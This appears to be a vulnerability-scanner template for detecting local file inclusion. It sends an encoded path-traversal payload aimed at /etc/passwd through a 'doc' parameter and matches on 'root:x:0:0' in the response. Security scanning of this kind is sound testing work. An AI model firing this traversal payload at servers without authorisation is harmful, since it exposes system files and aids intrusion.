id: lfi3-187
name: 'Traversal to passwd via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
